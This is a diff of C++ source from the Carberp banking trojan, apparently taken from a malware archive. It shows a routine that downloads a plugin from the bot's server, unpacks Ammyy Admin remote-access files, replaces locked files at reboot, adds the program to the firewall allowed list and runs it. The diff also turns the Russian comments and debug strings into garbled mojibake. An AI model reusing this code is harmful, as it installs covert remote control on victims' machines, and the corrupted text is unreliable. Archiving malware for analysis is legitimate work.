@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "ammyy.h"
 #include "BotDebug.h"
 #include "BotCore.h"
@@ -21,7 +32,7 @@ static char* GetAppFolder( char* path )
 
 static DWORD WINAPI ThreadInstallam(void*)
 {
-	DbgAm( "Скачиваем ammy.plug" );
+	DbgAm( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ammy.plug" );
 	BYTE* data = 0;
 	DWORD size = 0;
 	data = Plugin::Download( "ammy.plug", 0, &size, false );
@@ -31,16 +42,16 @@ static DWORD WINAPI ThreadInstallam(void*)
 		char tempCab[MAX_PATH], folderAmmy[MAX_PATH];
 		File::GetTempName(tempCab);
 		File::WriteBufferA( tempCab, data, size );
-		DbgAm( "Сохранили ammy.plug в %s", tempCab );
+		DbgAm( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ammy.plug пїЅ %s", tempCab );
 		GetAppFolder(folderAmmy);
 		pCreateDirectoryA( folderAmmy, 0 );
-		//aa.exe рапаковываем как aa1.exe, чтобы проще сделать переписывае если файл aa.exe занят
+		//aa.exe пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ aa1.exe, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ aa.exe пїЅпїЅпїЅпїЅпїЅ
 		const char* renames[] = { "aa.exe", "aa1.exe", "iphlpapi.dll", "iphlpapi1.dll", 0, 0 };
 		if( ExtractCab( tempCab, folderAmmy, renames ) )
 		{
-			DbgAm( "Распаковали в папку %s", folderAmmy );
+			DbgAm( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderAmmy );
 
-			//создаем файл am.cfg
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ am.cfg
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 			char* mem = (char*)HEAP::Alloc(1024);
 			char* p = mem;
@@ -62,7 +73,7 @@ static DWORD WINAPI ThreadInstallam(void*)
 			{
 				pPathAppendA( folderAmmy, renames[i] );
 				pPathAppendA( pathAA1, renames[i + 1] );
-				//если файл не перепишется (уже запущен), то перезапишется после ребута
+				//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ), пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				if( !pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING ) )
 					pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 
@@ -74,7 +85,7 @@ static DWORD WINAPI ThreadInstallam(void*)
 			if( AddAllowedprogram(folderAmmy) )
 			{
 				RunFileA(folderAmmy);
-				DbgAm( "ammy успешно запущен" );
+				DbgAm( "ammy пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			}
 		}
 		pDeleteFileA(tempCab);
@@ -102,7 +113,7 @@ bool Install( bool update )
 	    OSVERSIONINFOA ver;
 	    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
 	    pGetVersionExA(&ver);
-		if( ver.dwMajorVersion < 6 ) //команда работает только для XP
+		if( ver.dwMajorVersion < 6 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ XP
 			RunThread( ThreadInstallam, 0 );
 	}
 	return true;
